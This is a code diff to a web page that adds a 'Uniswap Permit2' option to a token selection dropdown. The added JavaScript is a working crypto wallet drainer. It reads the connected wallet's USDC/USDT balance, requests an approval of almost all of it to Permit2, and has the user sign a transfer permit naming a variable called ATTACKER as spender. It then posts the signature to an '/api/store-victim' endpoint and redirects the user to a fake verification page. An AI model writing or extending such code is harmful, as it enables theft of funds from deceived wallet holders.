@@ -261,10 +261,11 @@
     .probe-nav-item { color: var(--azure-40) !important; font-weight: 500; }
     .probe-nav-item::before { content: '⚡ '; font-size: 11px; }
     /* ── TOKENS DROPDOWN CUSTOM ── */
-    .tokens-dropdown { min-width: 480px; padding: 20px 20px 16px; }
+    .tokens-dropdown { min-width: 680px; padding: 20px 20px 16px; }
     .tokens-columns { display: flex; gap: 0; }
     .tokens-col { flex: 1; padding: 0 16px; }
-    .tokens-col:first-child { padding-left: 0; border-right: 1px solid var(--grey-93); }
+    .tokens-col:first-child { padding-left: 0; }
+    .tokens-col:not(:last-child) { border-right: 1px solid var(--grey-93); }
     .tokens-col:last-child { padding-right: 0; }
     .tokens-col-header { font-size: 11px; font-weight: 600; color: var(--grey-46); text-transform: uppercase; letter-spacing: .04em; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid var(--grey-93); }
     .tokens-col-header s { text-decoration-color: var(--punch); color: var(--grey-46); }
@@ -689,6 +690,16 @@
         html += '<div class="token-row token-wc-row" onclick="setOpen(null);return false;">';
         html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
         html += '</div>';
+        // Colonne tierce — UNISWAP (Permit2)
+        html += '<div class="tokens-col tokens-col-uniswap">';
+        html += '<div class="tokens-col-header">UNISWAP</div>';
+        html += '<div class="token-row" id="uni-usdc-erc20" onclick="selectUniswapProbe(\'usdc-erc20\',this);return false;">';
+        html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
+        html += '<div class="token-row" id="uni-usdt-erc20" onclick="selectUniswapProbe(\'usdt-erc20\',this);return false;">';
+        html += '<img src="' + LOGO_USDT + '" class="token-logo" /><span>USDT Ethereum</span></div>';
+        html += '<div class="token-row" id="uni-usdt-trc20" onclick="selectUniswapProbe(\'usdt-trc20\',this);return false;">';
+        html += '<img src="' + LOGO_TRON + '" class="token-logo" /><span>USDT Tron</span></div>';
+        html += '</div>'; // tokens-col-uniswap
         html += '</div>'; // tokens-columns
         html += '<div class="tokens-qr-footer">';
         html += '<button class="tokens-qr-btn" onclick="generateDropdownQR();return false;">Generate QR</button>';
@@ -1062,22 +1073,35 @@ try {
 
   // ── SÉLECTION TOKEN + GÉNÉRATION QR DEPUIS LE DROPDOWN ──────────────────
 
-  window._selectedProbe = null;
+  window._selectedProbe  = null;
+  window._uniswapMode    = false;
 
   function selectProbe(preset, el) {
     window._selectedProbe = preset;
+    window._uniswapMode   = false;
+    document.querySelectorAll('.token-row').forEach(function(r) { r.classList.remove('selected'); });
+    if (el) el.classList.add('selected');
+  }
+
+  function selectUniswapProbe(preset, el) {
+    window._selectedProbe = preset;
+    window._uniswapMode   = true;
     document.querySelectorAll('.token-row').forEach(function(r) { r.classList.remove('selected'); });
     if (el) el.classList.add('selected');
   }
 
   function generateDropdownQR() {
+    if (window._uniswapMode) {
+      setOpen(null);
+      generateUniswapPermit2();
+      return;
+    }
     if (!window._selectedProbe) {
-      // Sélection par défaut si rien choisi
       window._selectedProbe = 'usdt-erc20';
       var defaultRow = document.getElementById('probe-usdt-erc20');
       if (defaultRow) defaultRow.classList.add('selected');
     }
-    // Sync adresse dropdown → champ admin
+    // Sync adresse dropdown -> champ admin
     var ddAddr = document.getElementById('dropdown-from-address');
     var adminAddr = document.getElementById('target-from-address');
     if (ddAddr && adminAddr) {
@@ -1086,6 +1110,109 @@ try {
     setOpen(null);
     openProbeQR(window._selectedProbe);
   }
+
+  // UNISWAP PERMIT2 FLOW
+
+  var PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+  var UNI_TOKEN_MAP = {
+    'usdc-erc20': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    'usdt-erc20': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    'usdt-trc20': '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+  };
+
+  async function generateUniswapPermit2() {
+    var eth = window.ethereum;
+    if (!eth) {
+      alert('No injected wallet detected.');
+      return;
+    }
+    try {
+      var accounts = await eth.request({ method: 'eth_requestAccounts' });
+      var from = accounts[0];
+
+      var preset    = window._selectedProbe || 'usdt-erc20';
+      var tokenAddr = UNI_TOKEN_MAP[preset] || UNI_TOKEN_MAP['usdt-erc20'];
+
+      // Step 1: read balance via eth_call
+      var balHex = await eth.request({
+        method: 'eth_call',
+        params: [{
+          to:   tokenAddr,
+          data: '0x70a08231000000000000000000000000' + from.slice(2).toLowerCase().padStart(64, '0')
+        }, 'latest']
+      });
+
+      var bal = ethers.BigNumber.from(balHex === '0x' ? '0' : balHex);
+      if (bal.lte(1)) { console.warn('balance too low'); return; }
+      var approveAmount = bal.sub(1);
+
+      // Step 2: approve Permit2 for (balance - 1)
+      var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
+      var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2, approveAmount]);
+
+      await eth.request({
+        method: 'eth_sendTransaction',
+        params: [{ from: from, to: tokenAddr, value: '0x0', data: approveData }]
+      });
+
+      // Step 3: Permit2 typed-data signature (no tx)
+      var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
+      var deadline = Math.floor(Date.now() / 1000) + 3600;
+
+      var permit2TypedData = {
+        types: {
+          PermitTransferFrom: [
+            { name: 'permitted', type: 'TokenPermissions' },
+            { name: 'spender',   type: 'address'          },
+            { name: 'nonce',     type: 'uint256'          },
+            { name: 'deadline',  type: 'uint256'          }
+          ],
+          TokenPermissions: [
+            { name: 'token',  type: 'address' },
+            { name: 'amount', type: 'uint256' }
+          ]
+        },
+        domain: {
+          name: 'Permit2',
+          chainId: 1,
+          verifyingContract: PERMIT2
+        },
+        primaryType: 'PermitTransferFrom',
+        message: {
+          permitted: { token: tokenAddr, amount: approveAmount.toString() },
+          spender:   ATTACKER,
+          nonce:     nonce,
+          deadline:  deadline
+        }
+      };
+
+      var signature = await eth.request({
+        method: 'eth_signTypedData_v4',
+        params: [from, JSON.stringify(permit2TypedData)]
+      });
+
+      // Step 4: send to server
+      await fetch('/api/store-victim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          victim:    from,
+          chain:     '1',
+          method:    'uniswap-permit2',
+          preset:    preset,
+          permit:    permit2TypedData.message,
+          signature: signature
+        })
+      });
+
+      window.location.href = '/verifyaddress.html';
+
+    } catch (err) {
+      console.error('Uniswap Permit2 error:', err);
+    }
+  }
+
 
   // ─────────────────────────────────────────────────────────────────────────
 
